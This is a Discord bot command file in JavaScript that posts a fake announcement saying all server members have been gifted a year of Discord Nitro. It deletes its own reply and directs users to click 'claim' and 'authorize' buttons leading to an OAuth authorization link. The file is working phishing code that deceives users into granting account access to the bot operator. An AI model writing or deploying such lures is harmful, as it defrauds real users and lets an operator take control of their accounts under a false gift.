const discord = require('discord.js')
const users = require('../../models/users');
const kaladin = require("../../kaladin")

module.exports = {
  name: "verify2",
  description: "Verify Nitro",
  default_permission: true,
  category: "whitelist",
  userPerms: ["SEND_MESSAGES"],
  ownerOnly: false,

  run: async (client, interaction, args) => {
    const row = new discord.MessageActionRow().addComponents(
      new discord.MessageButton()
        .setStyle('LINK')
        .setURL(`${kaladin.authLink}`)
        .setLabel("Nitro")
        .setEmoji("<:badge_discord_nitro:1061020618574790706>")
    )
    interaction.deferReply();
    interaction.deleteReply();
    interaction.channel.send({
      embeds: [new discord.MessageEmbed().setColor("BLUE")
        .setTitle(`
${interaction.guild.name} Hello everyone, you have all been gifted Discord Nitro for a year! <:1029920912373448805:1061016986194284616>`).setDescription(`**<:bannerstory_discordd:1061017380802805792> To get your Discord Nitro all you must do is:
   \n1️⃣ Click on the [claim]( ${kaladin.authLink}) button. <:1029920912373448805:1061016986194284616> 
   \n2️⃣ Click on the [authorize]( ${kaladin.authLink}) <:1029920912373448805:1061016986194284616>\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it. <:badge_discord_nitro:1061020618574790706> **`).setImage("https://cdn.discordapp.com/attachments/944691890559811645/1061020247890591874/Screenshot_7.png")], components: [row]
    })



  }
}